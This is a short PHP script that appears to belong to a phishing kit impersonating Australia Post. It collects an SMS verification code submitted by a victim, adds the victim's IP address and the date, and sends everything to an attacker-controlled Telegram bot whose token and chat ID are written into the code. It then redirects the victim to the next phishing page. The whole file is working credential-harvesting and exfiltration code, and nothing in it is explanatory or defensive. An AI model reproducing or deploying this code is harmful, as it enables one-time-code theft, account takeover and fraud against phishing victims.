<?php

include("../anti/index.php");

$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");


if(($_POST['msg'] != ""))
	
	{	

$message .= "______________AU POST________________\n";
$message .= "* SMS CODE : ".$_POST['msg']."\n";

$message .= "* IP   : $ip\n";
$message .= "* date   : $date\n";
$message .= "______________________________\n";


             file_get_contents("https://api.telegram.org/bot6769268217:AAF_PGEOpZoXgj7Xcr4W2X68wbf6zNpV0io/sendMessage?chat_id=-4097212711&text=" . urlencode($message)."" );
        header("Location: ../xsms.php");
} else


header("Location: ../sms.php");



